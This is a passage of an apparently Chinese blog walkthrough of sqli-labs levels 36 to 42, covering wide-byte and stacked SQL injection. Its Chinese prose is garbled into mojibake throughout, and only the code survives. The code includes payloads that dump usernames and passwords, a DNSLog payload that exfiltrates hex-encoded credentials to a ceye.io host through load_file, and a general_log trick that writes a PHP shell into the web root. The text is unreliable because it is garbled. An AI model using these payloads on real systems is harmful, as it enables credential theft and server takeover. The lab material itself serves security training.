ä¼šæ£€æµ‹å¹¶è½¬ä¹‰å¦‚ä¸‹å±é™©å­—ç¬¦ï¼š</p><table><thead><tr><th align="left">å±é™©å­—ç¬¦</th><th align="left">è½¬ä¹‰å</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>è¿™ä¸€å…³ä½¿ç”¨ Less-34 å…³çš„ä¸¤ç§æ€è·¯ä¾ç„¶æ˜¯å¯è¡Œçš„ï¼Œä¸‹é¢ç›´æ¥å°è¯• payload è¿›è¡Œæ³¨å…¥å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1ï¿½&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>ä¾ç„¶ä½¿ç”¨äº† å’Œ Less-36 çš„é˜²æŠ¤æ–¹æ³•ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥åˆ©ç”¨æ€è·¯ä¹Ÿæ˜¯ä¸€æ¯›ä¸€æ ·çš„ï¼Œåªæ˜¯ç”± GET å‹å˜æˆäº† POST å‹äº†ï¼Œä¸‹é¢å°±ç›´æ¥å°è¯•æ³¨å…¥å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;%df&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;ï¿½&#39; and 1&#x3D;2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å †å æ³¨å…¥-38-53-å…³"><a href="#å †å æ³¨å…¥-38-53-å…³" class="headerlink" title="å †å æ³¨å…¥ 38-53 å…³"></a>å †å æ³¨å…¥ 38-53 å…³</h1><h2 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h2><p>MySQL çš„å‘½ä»¤è¡Œä¸­ï¼Œæ¯ä¸€æ¡è¯­å¥ä»¥<code>;</code>ç»“å°¾ï¼Œè¿™ä»£è¡¨è¯­å¥çš„ç»“æŸï¼Œå¦‚æœåœ¨æ³¨å…¥è¿‡ç¨‹ä¸­åœ¨<code>;</code>åé¢æ·»åŠ è¦æ‰§è¡Œçš„ SQL è¯­å¥çš„è¯ï¼Œè¿™ç§æ³¨å…¥æ–¹å¼å°±å«åšå †å æ³¨å…¥ (stacked injection) ã€‚ä¸‹é¢å°±æ˜¯ç®€å•çš„ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>+-------------------------+<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span>+-------------------------+<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span>+-------------------------+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ union select è”åˆæŸ¥è¯¢ç›¸æ¯”ï¼Œå †å æŸ¥è¯¢æ›´åŠ çµæ´»ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„çš„ SQL è¯­å¥ã€‚</p><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><ol><li>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ã€‚</li><li>åœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬ äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥</li></ol><p>è¿™ä¸ªå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å°è¯•ç”¨ union select è”åˆæŸ¥è¯¢çš„åŸå› ï¼Œä½¿ç”¨å †å æ³¨å…¥å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦äº†è§£æ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯æ‰å¯ä»¥ï¼Œå¦‚è¡¨åã€åˆ—åç­‰</p><h3 id="å„ä¸ªæ•°æ®åº“å †å æŸ¥è¯¢å®ä¾‹"><a href="#å„ä¸ªæ•°æ®åº“å †å æŸ¥è¯¢å®ä¾‹" class="headerlink" title="å„ä¸ªæ•°æ®åº“å †å æŸ¥è¯¢å®ä¾‹"></a>å„ä¸ªæ•°æ®åº“å †å æŸ¥è¯¢å®ä¾‹</h3><p><strong>MySQL</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL Server</strong></p><pre class="line-numbers language-mssql" data-language="mssql"><code class="language-mssql">select 1,2,3;select * from test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Postgresql</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_test<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨å…¥å¤©ä¹¦é‡Œé¢è¯´ Oracle ä¸æ”¯æŒå †å æŸ¥è¯¢ï¼Œè¿™ä¸ª æˆ‘å¯¹ Oracle ä¸ç†Ÿæ‚‰ï¼Œä»¥åæ¥è§¦åˆ°äº† å†äº²è‡ªå°è¯•çœ‹çœ‹ã€‚</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>åˆåˆ°äº†ç®€å•æºç åˆ†æçš„æ—¶é—´äº†ï¼Œæ¥çœ‹çœ‹å †å æ³¨å…¥çš„ä»£ç æ˜¯å¦‚ä½•å®ç°çš„ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id å‚æ•°ç›´æ¥å¸¦å…¥åˆ° SQL è¯­å¥ä¸­</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°å’Œä¹‹å‰çš„å…³å¡åŒºåˆ«ä¸å¤§ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯æŸ¥è¯¢ SQL è¯­å¥ç”±åŸæ¥çš„ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å˜æˆäº†ç°åœ¨çš„ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>mysqli_multi_query</code> å‡½æ•°ç”¨äºæ‰§è¡Œä¸€ä¸ª SQL è¯­å¥ï¼Œæˆ–è€…å¤šä¸ªä½¿ç”¨åˆ†å·åˆ†éš”çš„ SQL è¯­å¥ã€‚è¿™ä¸ªå°±æ˜¯å †å æ³¨å…¥äº§ç”Ÿçš„åŸå› ï¼Œå› ä¸ºæœ¬èº«å°±æ”¯æŒå¤šä¸ª SQL è¯­å¥ã€‚</p><p>æ—¢ç„¶çŸ¥é“åŸç†äº† é‚£ä¹ˆè¿™ä¸€å…³å°±è¯¦ç»†æ¼”ç¤ºä¸€ä¸‹è¿™ä¸ªå †å æ³¨å…¥å¦‚ä½•çµæ´»ä½¿ç”¨ï¼š</p><p><strong>æ·»åŠ å­—æ®µå€¼</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;insert into users(username,password) values (&#39;hello&#39;,&#39;world&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“ä¸­æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span> <span class="token number">23</span> <span class="token operator">|</span> hello    <span class="token operator">|</span> world    <span class="token operator">|</span>+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™ä¸ªè²Œä¼¼å¹¶æ²¡æœ‰ä»€ä¹ˆä½œç”¨ï¼Œä½†æ˜¯æ³¨å…¥å¤©ä¹¦é‡Œé¢ä¹Ÿæ²¡æœ‰è¯´å…¶ä»–çš„å§¿åŠ¿ï¼Œå®é™…ä¸Šçœ‹åˆ°è¿™é‡Œçš„äººåº”è¯¥æ˜ç™½åé¢æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„ SQL è¯­å¥çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ€ä¹ˆè¿›è¡Œæ¼æ´åˆ©ç”¨çš„è¯ å°±å®Œå…¨çœ‹ä½ çš„æƒ³è±¡åŠ›äº†ï¼Œæ¥ä¸‹æ¥ æ¼”ç¤ºæˆ‘è®¤ä¸ºæ¯”è¾ƒå®ç”¨çš„å§¿åŠ¿ã€‚</p><h3 id="DNSLog-æ•°æ®å¤–å¸¦"><a href="#DNSLog-æ•°æ®å¤–å¸¦" class="headerlink" title="DNSLog æ•°æ®å¤–å¸¦"></a>DNSLog æ•°æ®å¤–å¸¦</h3><p>éœ€è¦æ¡ä»¶ï¼š</p><ol><li>MySQL å¼€å¯ load_file()</li><li>DNSLog å¹³å° ï¼ˆ<a href="http://hyuga.co/">Hyuga</a>ã€<a href="http://ceye.io/">CEYE</a>ï¼‰</li><li>Windows å¹³å°</li></ol><p>load_file å‡½æ•°åœ¨ Linux ä¸‹æ˜¯æ— æ³•ç”¨æ¥åš DNSLog æ”»å‡»çš„ï¼Œå› ä¸ºåœ¨è¿™é‡Œå°±æ¶‰åŠåˆ° Windows çš„ UNC è·¯å¾„ã€‚</p><p>å…¶å®æˆ‘ä»¬å¹³å¸¸åœ¨Widnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼</p><pre class="line-numbers language-none"><code class="language-none">\\192.168.31.53\test\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>CONCAT()</code> å‡½æ•°æ‹¼æ¥äº†4ä¸ª<code>\</code>äº†ï¼Œå› ä¸ºè½¬ä¹‰çš„åŸå› ï¼Œ4ä¸ªå°±å˜<code>\</code>æˆäº†2ä¸ª<code>\</code>ï¼Œç›®çš„å°±æ˜¯åˆ©ç”¨ UNC è·¯å¾„ã€‚</p><p>å› ä¸º Linux æ²¡æœ‰ UNC è·¯å¾„è¿™ä¸ªä¸œè¥¿ï¼Œæ‰€ä»¥å½“ MySQL å¤„äº Linux ç³»ç»Ÿä¸­çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼å¤–å¸¦æ•°æ®çš„ã€‚</p><p>ä¸‹é¢ ä¸´æ—¶ä½¿ç”¨ Windows ä¸‹çš„ PHPStudy æ¥æ­å»º sqli-labs æµ‹è¯•ç¯å¢ƒï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;select load_file(concat(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.gvc791.ceye.io\\abc&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Hex ç¼–ç çš„ç›®çš„å°±æ˜¯å‡å°‘å¹²æ‰°ï¼Œå› ä¸ºåŸŸåæ˜¯æœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šç¬¦å·æ˜¯ä¸èƒ½å¸¦å…¥çš„æœ‰ã€‚</p><p><img src="https://image.3001.net/images/20200517/15897015756622.png" alt="img"></p><p>æ‰‹åŠ¨ Hex è§£ç å³å¯</p><h3 id="å¼€å¯æ—¥å¿—-Getshell"><a href="#å¼€å¯æ—¥å¿—-Getshell" class="headerlink" title="å¼€å¯æ—¥å¿— Getshell"></a>å¼€å¯æ—¥å¿— Getshell</h3><p>éœ€è¦æ¡ä»¶ï¼š</p><ol><li>Web çš„ç‰©ç†è·¯å¾„</li><li>MySQL å¯ä»¥è¯»å†™ Web ç›®å½•</li><li>Windows æˆåŠŸç‡ é«˜äº Linux</li></ol><p>é¦–å…ˆæŸ¥çœ‹å½“å‰çš„æ—¥å¿—çš„ç›¸å…³é…ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>+------------------+---------------------------------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                           <span class="token operator">|</span>+------------------+---------------------------------+<span class="token operator">|</span> general_log      <span class="token operator">|</span> OFF                             <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/lib/mysql/bb198f1a9cc6.log <span class="token operator">|</span>+------------------+---------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Docker é‡Œé¢çš„è¿™ä¸ª Ubuntu ç¯å¢ƒé»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯çš„ï¼Œè¿™é‡Œå°è¯•æ³¨å…¥çš„æ—¶å€™æ‰‹åŠ¨å¼€å¯ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;;set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶å MySQL å†æŸ¥çœ‹æ—¥å¿—é…ç½®æ˜¯å¦è¢«ä¿®æ”¹äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW VARIABLES LIKE <span class="token string">'general%'</span><span class="token punctuation">;</span>+------------------+-------------------------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value                   <span class="token operator">|</span>+------------------+-------------------------+<span class="token operator">|</span> general_log      <span class="token operator">|</span> ON                      <span class="token operator">|</span><span class="token operator">|</span> general_log_file <span class="token operator">|</span> /var/www/html/shell.php <span class="token operator">|</span>+------------------+-------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªå°è¯• getshellï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ—¥å¿—é‡Œé¢å°±ä¼šè®°å½•<code>&lt;?php phpinfo();?&gt;</code>ï¼Œæµè§ˆå™¨è®¿é—®æŸ¥çœ‹ï¼š</p><p>æŸ¥çœ‹ä¸€ä¸‹å½“çš„æ—¥å¿—æ–‡ä»¶ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$ cat <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php<span class="token number">200517</span>  <span class="token number">8</span>:<span class="token number">47</span>:<span class="token number">04</span>       <span class="token number">10</span> <span class="token keyword">Connect</span>    root<span class="token variable">@localhost</span> <span class="token keyword">on</span> security           <span class="token number">10</span> Init DB    security           <span class="token number">10</span> Query    <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token comment">-- ' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å·²ç»æˆåŠŸå†™å…¥äº†ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶å±äº mysql ç”¨æˆ·ç»„çš„ï¼Œ æˆ‘æµ‹è¯•å¹¶æ²¡æœ‰æˆåŠŸæ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -l  /var/www/html/shell.php-rw-rw---- <span class="token number">1</span> mysql mysql <span class="token number">171</span> May <span class="token number">17</span> 08:47 /var/www/html/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸è¿‡åœ¨ Windows ä¸‹ phpstudy æµ‹è¯•æ˜¯å¯ä»¥å¾ˆæˆåŠŸçš„ getshell çš„ï¼Œå¦‚æœæœ‰å¸ˆå‚…è¡¥å……çš„è¯ æ¬¢è¿è¯„è®ºåŒºç•™è¨€ï¼</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>å’Œ Less-38 ç›¸æ¯”æ²¡æœ‰å•¥åŒºåˆ«ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ã€‚</p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>å’Œ Less-38 ç›¸æ¯”åªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ã€‚</p><p>ä½†æ˜¯çœ‹äº†è¿™ä¸€å…³æºç ä¸‹é¢è¿˜æœ‰å…¶ä»–æ–‡ä»¶ï¼Œç±»ä¼¼äº Less-24 çš„äºŒæ¬¡æ³¨å…¥ï¼Œçœ‹äº†ä¸‹æºç è²Œä¼¼å’Œ Less-24 æ˜¯ä¸€æ ·çš„ï¼Œå¯èƒ½æ˜¯ä½œè€…çš„ç–å¿½å§ï¼Œå¿˜è®°åˆ æ‰è¿™äº›ä¸ç›¸å¹²çš„æ–‡ä»¶äº†ã€‚</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>å’Œ Less-39 ç±»ä¼¼ï¼Œå› ä¸ºå°‘äº†æŠ¥é”™è¾“å‡ºï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œå…¶ä»–æ³¨å…¥æ–¹å¼ä¸€æ ·ï¼Œ è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>æ²¡æœ‰å•¥æ ¸å¿ƒä»£ç ï¼ŒPHP å’Œ HTML æ··å†™ï¼Œåªè¦å†™äº†ç™»å½•çš„è¡¨å•ï¼Œå¹¶æä¾›äº†å¿˜è®°å¯†ç å’Œåˆ›å»ºç”¨æˆ·çš„é“¾æ¥ï¼Œç›¸æ¯”äº Less-24 çš„äºŒæ¬¡æ³¨å…¥ï¼Œè¿™ä¸¤ä¸ªé“¾æ¥éƒ½ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œæ— æ³•ç›´æ¥åˆ›å»ºç”¨æˆ·ã€‚</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># username è¢«è¿‡æ»¤ ' " \ password æ²¡æœ‰è¢«</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># å †å æŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> æŸ¥è¯¢æˆåŠŸï¼š    <span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> ç™»å½•æˆåŠŸ<span class="token punctuation">:</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Auth"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    è·³è½¬åˆ° logged<span class="token operator">-</span>in<span class="token operator">.</span>php<span aria-hidden="true" 